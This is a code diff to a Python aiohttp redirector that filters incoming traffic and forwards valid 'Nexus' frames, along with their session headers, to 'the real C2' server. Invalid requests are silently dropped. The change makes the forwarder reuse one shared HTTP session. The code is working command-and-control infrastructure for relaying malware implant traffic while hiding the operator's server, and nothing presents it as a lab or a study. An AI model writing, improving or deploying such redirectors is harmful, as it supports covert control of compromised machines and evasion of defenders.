@@ -56,22 +56,31 @@ async def handle(request: web.Request) -> web.Response:
                     len(body), body[0] if body else 0)
         return web.Response(status=200, text="")
 
-    # Forward valid Nexus frames to the real C2
+    # Forward valid Nexus frames to the real C2 using the shared session
     fwd_headers = {}
     for h in ("Content-Type", "X-Session-Id"):
         if h in request.headers:
             fwd_headers[h] = request.headers[h]
 
+    session: ClientSession = request.app["http_session"]
     try:
-        async with ClientSession(timeout=_TIMEOUT) as session:
-            async with session.post(C2_URL + "/", data=body, headers=fwd_headers) as resp:
-                data = await resp.read()
-                ct   = resp.headers.get("Content-Type", "application/octet-stream")
-                log.info("FWD    → %d B | ← %d B (status=%d)", len(body), len(data), resp.status)
-                return web.Response(body=data, status=resp.status, content_type=ct)
+        async with session.post(C2_URL + "/", data=body, headers=fwd_headers) as resp:
+            data = await resp.read()
+            ct   = resp.headers.get("Content-Type", "application/octet-stream")
+            log.info("FWD    → %d B | ← %d B (status=%d)", len(body), len(data), resp.status)
+            return web.Response(body=data, status=resp.status, content_type=ct)
     except Exception as exc:
         log.error("forward error: %s", exc)
         return web.Response(status=502, text="")
+
+
+async def _on_startup(app: web.Application) -> None:
+    app["http_session"] = ClientSession(timeout=_TIMEOUT)
+    log.info("redirector → C2 at %s", C2_URL)
+
+
+async def _on_cleanup(app: web.Application) -> None:
+    await app["http_session"].close()
 
 
 def build_app() -> web.Application:
@@ -80,4 +89,6 @@ def build_app() -> web.Application:
         client_max_size=1 * 1024 * 1024,
     )
     app.router.add_route("*", "/", handle)
+    app.on_startup.append(_on_startup)
+    app.on_cleanup.append(_on_cleanup)
     return app
